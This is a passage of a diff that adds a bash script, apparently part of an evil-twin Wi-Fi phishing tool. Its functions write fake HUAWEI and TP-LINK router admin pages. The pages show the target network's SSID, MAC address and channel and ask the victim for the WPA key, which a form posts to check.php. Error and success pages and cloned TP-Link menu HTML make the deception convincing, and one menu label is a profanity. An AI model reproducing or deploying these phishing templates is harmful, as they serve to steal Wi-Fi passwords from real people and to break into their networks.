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
+\" height=\"50\" width=\"50\"></td>
+        </tr>
+      </tbody></table>
+      </TBODY>
+    </TABLE>
+      </blockquote>
+</BODY>
+</HTML>
+ ">$DUMP_PATH/data/error.html
+}
+
+function infohtml {
+echo "<html>
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info2.css\" media=\"all\">
+</head>
+<body bgcolor=\"transparent\" marginheight=\"0\" marginwidth=\"0\">
+<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
+  <tbody><tr> 
+      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
+      <div valign=\"top\" align=\"left\"> 
+        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\"> 
+          </tr>
+          <TABLE id=\"autoWidth\">
+      <TBODY>
+<tr><td><hr color=\"#9CBCE3\" size=1 width=\"99%\"></td></tr>
+
+                <tr><td colspan=\"2\" ><font color=\"#282B2F\">SSID: <b>$Host_SSID</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"#282B2F\">MAC Address: <b>$Host_MAC</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"#282B2F\">Channel: <b>$Host_CHAN</b></td></tr>
+
+<tr><td></td></tr>
+<tr><td><hr color=\"#9CBCE3\" size=1 width=\"99%\"></td></tr>
+<tr><td></td></tr>
+        <TR>
+        <TD class=info1 colspan=2>
+<br><font color=\"#282B2F\">
+$DIALOG_WEB_INFO
+<br>
+<br>
+<div id=\"box\" align=\"left\" >
+<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"check.php\" >
+<tr><td><b>$Host_ENC</b> Key:</td></tr>
+<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>
+        <TR><TD class=blue colspan=2></TD></TR>
+                <TR><TD class=blue colspan=2></TD></TR>  
+<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>
+</form></div>
+</TD></TR>
+      </TBODY>
+    </TABLE>
+</table></div></td></tr></tbody></table>
+</body>
+</html>
+">$DUMP_PATH/data/info.html
+              }
+	   
+	   
+function index {
+echo " <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
+<html xmlns=\"http://www.w3.org/1999/xhtml\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
+	<title>HUAWEI</title>
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
+</head>
+<body>	
+		<div class=\"panel_content\" id=\"panel_content\"><div class=\"house\">
+		<div style=\"cursor: auto;\" id=\"internet\" class=\"divInternet\">
+		<div class=\"internet\" id=\"iconInternet\" internet_status=\"INTERNET_OK\"></div>
+		<div class=\"internet_txt\">
+			<span class=\"trad\" key=\"MAP_INTERNET\"><A href=\"\"><font color=\"black\">$DIALOG_WEB_INDEX_HUAWEI_6</A></span>
+			<span class=\"internet_des trad\" key=\"COMMON_EMPTY\" id=\"internetAlert\"> </span>
+		</div>
+	</div>
+	<div id=\"threeG\" class=\"threeG hand trad\" style=\"\">
+		<div style=\"background-position: 0px 0px;\" id=\"threeG_icos\" class=\"threeG_ico\" power3g=\"3\"></div>
+		<span class=\"threeG_txt hand trad\" key=\"MAP_3G\"><A href=\"\"><font color\"#F6832A\"></span>
+	</div>
+	<div adslconfigurable=\"true\" id=\"adsl\" adslactive=\"false\" class=\"adsl trad hand\">
+		<div style=\"background-position: -152px 0px;\" class=\"adsl_ico\" id=\"iconadsl\"></div>
+		<span class=\"adsl_txt trad\" key=\"MAP_ADSL\"><A href=\"\"><font color=\"#F6832A\"></A></span>
+	</div>	
+	<div id=\"wifi\" class=\"hand disabled\">
+		<div class=\"wifi_ico\" color=\"red\"></div>
+		<span class=\"gateway\"></span>
+		<span class=\"wifi_txt trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"red\" >$DIALOG_WEB_INDEX_5</A></span>
+	</div>
+	
+	<div id=\"wifi2\" class=\"hand disabled\">
+		<div class=\"wifi_ico2\" color=\"red\"></div>
+		<span class=\"gateway2\"></span>
+		<span class=\"wifi_txt2 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_1-</A></span>
+	</div>
+	
+	<div id=\"wifi3\" class=\"hand disabled\">
+		<div class=\"wifi_ico3\" color=\"red\"></div>
+		<span class=\"gateway3\"></span>
+		<span class=\"wifi_txt3 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_2-</A></span>
+	</div>
+	
+	<div id=\"wifi4\" class=\"hand disabled\">
+		<div class=\"wifi_ico4\" color=\"red\"></div>
+		<span class=\"gateway4\"></span>
+		<span class=\"wifi_txt4 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_3-</A></span>
+	</div>
+	
+	<div id=\"wifi5\" class=\"hand disabled\">
+		<div class=\"wifi_ico5\" color=\"red\"></div>
+		<span class=\"gateway5\"></span>
+		<span class=\"wifi_txt5 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"black\" >-$DIALOG_WEB_INDEX_4-</A></span>
+	</div>
+	
+	<div class=\"scroll\">
+<iframe src=\"info.html\" width=\"440\" height=\"265\" align=\"center\">
+		</div>
+	
+        <div id=\"remaining_session_box\" style=\"float: right; display: none;\">
+		<span>Remaining Session: </span>	
+		<span id=\"remaining_session\"></span>
+	</div>
+
+</div></div></a>
+	</div>					
+  		
+	<div id=\"help_dialog\" class=\"dialog\"></div>
+	<div id=\"dialog\" class=\"dialog dialog_text\"></div>	
+	<div id=\"dialogWarning\" class=\"dialog dialog_text\"></div>
+</body>
+</html>
+">$DUMP_PATH/data/index.htm
+
+              }
+error && final && infohtml && index
+	      }
+	      
+	      
+	      
+#Conten interface web
+function TPLINK {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp -r $WORK_DIR/Sites/TP-LINK/TP $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/TP-LINK/index.htm $DUMP_PATH/data
+       
+        
+function error {
+echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" />
+</HEAD>
+
+<BODY>
+
+<CENTER>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+        <TR>
+$DIALOG_WEB_ERROR
+          <TD class=h1 colspan=2 id=\"t_title\">Password Error</TD>
+
+        </TR>
+
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>
+
+
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</CENTER>
+
+</BODY>
+
+</HTML>
+">$DUMP_PATH/data/TP/error.html
+               }
+               
+function final {
+echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" />
+</HEAD>
+
+<BODY>
+
+<CENTER>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+        <TR>
+
+          <TD class=h1 colspan=2 id=\"t_title\">$DIALOG_WEB_INDEX_16</TD>
+
+        </TR>
+
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+$DIALOG_WEB_OK .</TD></TR>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</CENTER>
+
+</BODY>
+
+</HTML>
+">$DUMP_PATH/data/TP/final.html
+               }
+               
+function status_help {
+echo "<html><head>
+<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\"><link href=\"css_help.css\" rel=\"stylesheet\">
+
+<!-- <TP_C_TAG \"htmlMiscHelp\">//-->
+</head><body>$DIALOG_WEB_INDEX_18
+<script type=\"text/javascript\">
+if(wlan_wds)
+document.write(\"<LI><B>WDS Status</B> - The status of WDS' connection, Init: WDS connection is down; Scan: Try to find the AP; Auth: Try to authenticate; ASSOC: Try to associate; Run: Associated successfully.</LI>\");
+</script>
+$DIALOG_WEB_INDEX_19
+</p></body></html>
+
+">$DUMP_PATH/data/TP/StatusHelpRpm.htm
+               }
+               
+function status_rpm {
+echo "<style>
+
+#box {
+ position:absolute;
+ top:20px;
+}
+
+</style>
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" />
+</HEAD>
+
+<BODY>
+
+<CENTER>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+        <TR>
+
+          <TD class=h1 colspan=2 id=\"t_title\">$DIALOG_WEB_INDEX_16</TD>
+
+        </TR>
+
+                <tr><td colspan=\"2\" align=\"center\" style=\"position:absolute;margin-left:120px;\"><b></b></td></tr>
+        <tr><td colspan=\"2\" align=\"center\" style=\"position:absolute;margin-top:14px;margin-left:67px;\">$DIALOG_WEB_INDEX_17<b></b></td></tr>
+        <tr><td colspan=\"2\" align=\"center\" style=\"position:absolute;margin-top:28px;margin-left:97px;\"><b></b></td></tr>
+<tr><td></td></tr>
+        
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+$DIALOG_WEB_INFO
+<div id=\"box\" align=\"left\" >
+<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"check.php\" >
+<br>
+<tr><td style=\"position:absolute;margin-left:190px;\"> WPA2 Key:</td></tr>
+<tr><td style=\"position:absolute;margin-top:14px;margin-left:130px;\"><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>
+
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+<tr><td colspan=\"2\" align=\"center\"><INPUT name=\"Confirm\" class=\"buttonBig\" type=\"submit\" value=\"Confirm\"/></td></tr>
+
+</form></div>
+
+</TD></TR>
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</CENTER>
+
+</BODY>
+
+</HTML>
+
+
+
+">$DUMP_PATH/data/TP/StatusRpm.htm
+               }
+               
+function menu_rpm {
+echo "<html><head>
+<script language=\"JavaScript\">
+var visibleMenuList = new Array(
+\"StatusRpm\",
+\"WzdStartRpm\",
+\"WpsCfgRpm\",
+\"NetworkCfgRpm\",
+\"WanCfgRpm\",
+\"MacCloneCfgRpm\",
+\"WlanNetworkRpm\",
+\"WlanSecurityRpm\",
+\"WlanMacFilterRpm\",
+\"WlanAdvRpm\",
+\"WlanStationRpm\",
+\"LanDhcpServerRpm\",
+\"AssignedIpAddrListRpm\",
+\"FixMapCfgRpm\",
+\"VirtualServerRpm\",
+\"SpecialAppRpm\",
+\"DMZRpm\",
+\"UpnpCfgRpm\",
+\"BasicSecurityRpm\",
+\"AdvScrRpm\",
+\"LocalManageControlRpm\",
+\"ManageControlRpm\",
+\"ParentCtrlRpm\",
+\"AccessCtrlAccessRulesRpm\",
+\"AccessCtrlHostsListsRpm\",
+\"AccessCtrlAccessTargetsRpm\",
+\"AccessCtrlTimeSchedRpm\",
+\"StaticRouteTableRpm\",
+\"QoSCfgRpm\",
+\"QoSRuleListRpm\",
+\"LanArpBindingRpm\",
+\"LanArpBindingListRpm\",
+\"DdnsAddRpm\",
+\"DateTimeCfgRpm\",
+\"DiagnosticRpm\",
+\"SoftwareUpgradeRpm\",
+\"RestoreDefaultCfgRpm\",
+\"BakNRestoreRpm\",
+\"SysRebootRpm\",
+\"ChangeLoginPwdRpm\",
+\"SystemLogRpm\",
+\"SystemStatisticRpm\",
+0,0 );
+</script>
+
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">
+<style type=\"text/css\">
+<!--
+BODY 
+{
+	margin-top: 20px;
+	margin-left: 0px;
+	FONT-FAMILY: Arial, Helvetica, Geneva, Swiss, SunSans-Regular;
+	WHITE-SPACE: nowrap;
+	BACKGROUND-COLOR: rgb(150,150,150)
+}
+menu 
+{
+	margin-left:0px;
+	PADDING-LEFT: 0px;
+	FONT-SIZE: 12px;
+	TEXT-DECORATION: none;
+	color: #2a166b;
+}
+ol 
+{
+	margin:2 0 0 0;
+	PADDING-LEFT: 13px;
+	FONT-WEIGHT: bold;
+	FONT-SIZE: 12px;
+	TEXT-DECORATION: none;
+	height: 22px;
+	line-height: 22px;
+	width:180;
+	list-style: inside none;
+	BACKGROUND-COLOR: rgb(66,66,66)
+}
+ol.info 
+{
+	margin:0 0 0 0;
+	COLOR: white;
+	width:180;
+	PADDING-LEFT: 2px;
+}
+a {
+	noneFocusLine: expression(this.onFocus=this.blur());
+}
+a:focus {
+	-moz-outline-style:none;
+}
+a.L1 {
+	COLOR: #C0C0C0;
+	PADDING-LEFT: 23px;
+}
+a.L3 {
+	COLOR: rgb(171,221,47);
+	PADDING-LEFT: 23px;
+}
+a.L2 {
+	COLOR: white;
+	PADDING-LEFT: 23px;
+}
+A:visited {
+	TEXT-DECORATION: none;
+	underline: none
+}
+A:link {
+	TEXT-DECORATION: none;
+	underline: none
+}
+ol.dot1 {
+	background-repeat:no-repeat;
+}
+ol.plus {
+	background-repeat:no-repeat;
+}
+ol.minus {
+	background-repeat:no-repeat;
+	background-color: rgb(102,186,51)
+}
+ol.dot2 {
+	background-repeat:no-repeat;
+	background-color: rgb(96,96,96)
+}
+ol.otherInfo {
+	PADDING-LEFT: 1px;
+	PADDING-RIGHT: 0px;
+}
+.hidden {
+	display: none;
+}
+.show {
+	display: block;
+}
+-->
+</style>
+</head>
+
+<body leftmargin=\"0\" topmargin=\"0\" bgcolor=\"#330099\" marginheight=\"0\" marginwidth=\"0\">
+<menu cellspacing=\"2\" cellpadding=\"1\" border=\"0\" width=\"180\">
+<script type=\"text/javascript\"><!--
+menuInit(visibleMenuList);
+menuDisplay();
+//--></script><ol id=\"ol0\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a0\" target=\"mainFrame\" class=\"L3\" onclick=\"doClick(0);\">$DIALOG_WEB_INDEX_1</a></ol><ol id=\"ol1\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a1\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(1);\">$DIALOG_WEB_INDEX_2</a></ol><ol id=\"ol3\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a3\" href=\"StatusRpm.htm\" target=\"mainFrame\" 
+class=\"L1\" onclick=\"doClick(3);\">$DIALOG_WEB_INDEX_3</a></ol><ol id=\"ol4\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a4\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(4);\">- LAN</a></ol><ol id=\"ol5\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a5\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(5);\">- WAN</a></ol><ol id=\"ol6\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a6\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(6);\">- MAC Clone</a></ol><ol id=\"ol7\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a7\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(7);\">$DIALOG_WEB_INDEX_4</a></ol><ol id=\"ol8\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a8\" href=\"StatusRpm.htm\" target=\"
+mainFrame\" class=\"L1\" onclick=\"doClick(8);\">MIERDA</a></ol><ol id=\"
+ol9\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a9\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(9);\">- Wireless Security</a></ol><ol id=\"ol10\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a10\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(10);\">- Wireless MAC Filtering</a></ol><ol id=\"ol11\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"
+><a id=\"a11\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(11);\">- Wireless Advanced</a></ol><ol id=\"ol12\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a12\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(12);\">- Wireless Statistics</a></ol><ol id=\"ol13\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a13\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(13);\">$DIALOG_WEB_INDEX_5</a></ol><ol id=\"ol14\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a14\" href=\"StatusRpm.htm\" target=\"mainFrame\" class\"L1\" onclick=\"doClick(14);\">- DHCP Settings</a></ol><ol 
+id=\"ol15\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a15\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(15);\">- DHCP Clients List</a></ol><ol id=\"ol16\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a16\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(16);\">- Address Reservation</a></ol><ol id=\"ol17\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a17\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(17);\">$DIALOG_WEB_INDEX_6</a></ol><ol id=\"ol18\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a18\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(18);\">- Virtual Servers</a></ol><ol id=\"ol19\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a19\" href=\"StatusRpm.htm\" target=\"
+mainFrame\" class=\"L1\" onclick=\"doClick(19);\">- Port Triggering</a></ol><ol id=\"ol20\"
+ class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a20\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(20);\">- DMZ</a></ol><ol id=\"ol21\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a21\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(21);\">- UPnP</a></ol><ol id=\"ol22\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a22\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(22);\">$DIALOG_WEB_INDEX_7</a></ol><ol id=\"ol23\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a23\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(23);\">- Basic Security</a></ol><ol id=\"ol24\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a24\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(24);\">$DIALOG_WEB_INDEX_1</a></ol><ol id=\"ol25\" class=\"dot2\" style=\"display:none; 
+background-position:2px;PADDING-LEFT:2px;\"><a id=\"a25\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(25);\">- Local Management</a></ol><ol id=\"ol26\" class=\"dot2\" 
+style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a26\" href=\"StatusRpm.ht\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(26);\">- Remote Management</a></ol><ol id=\"ol27\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a27\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(27);\">$DIALOG_WEB_INDEX_8</a></ol><ol id=\"ol28\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a28\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(28);\">$DIALOG_WEB_INDEX_9</a></ol><ol id=\"ol29\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a29\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(29);\">- Rule</a></ol><ol id=\"ol30\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a30\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(30);
+\">- Host</a></ol><ol id=\"ol31\" class=\"dot2\" style=\"display:none; 
+background-position:2px;PADDING-LEFT:2px;\"><a id=\"a31\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(31);\">- Target</a></ol><ol id=\"ol32\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a32\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(32);\">- Schedule</a></ol><ol id=\"ol33\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:
+2px;\"><a id=\"a33\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(33);\">$DIALOG_WEB_INDEX_10</a></ol><ol id=\"ol34\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a34\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(34);\">- Static Routing List</a></ol><ol id=\"ol35\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a35\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(35);\">$DIALOG_WEB_INDEX_11</a></ol><ol id=\"ol36\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a36\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(36);\">- Control 
+Settings</a></ol><ol id=\"ol37\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a37\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(37);\">- Rules List</a></ol><ol id=\"ol38\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a38\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(38);\">$DIALOG_WEB_INDEX_12</a></ol><ol id=\"ol39\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a39\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(39);\">- Binding Settings</a></ol><ol id=\"ol40\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a40\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(40);\">- ARP List</a></ol><ol id=\"ol41\" class=\"dot1\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a41\" href=\"StatusRpm.htm\" 
+target=\"mainFrame\" class=\"L1\" onclick=\"doClick(41);\">$DIALOG_WEB_INDEX_13</a></ol><ol 
+id=\"ol42\" class=\"plus\" style=\"display:block; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a42\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(42);\">$DIALOG_WEB_INDEX_14</a></ol><ol id=\"ol43\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a43\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(43);\">- Time Settings</a></ol><ol id=\"ol44\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;
+\"><a id=\"a44\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(44);\">- Diagnostic</a></ol><ol id=\"ol45\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a45\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(45);\">- Firmware Upgrade</a></ol><ol id=\"ol46\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a46\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(46);\">- Factory Defaults</a></ol><ol id=\"ol47\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a47\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(47);\">- Backup &amp; 
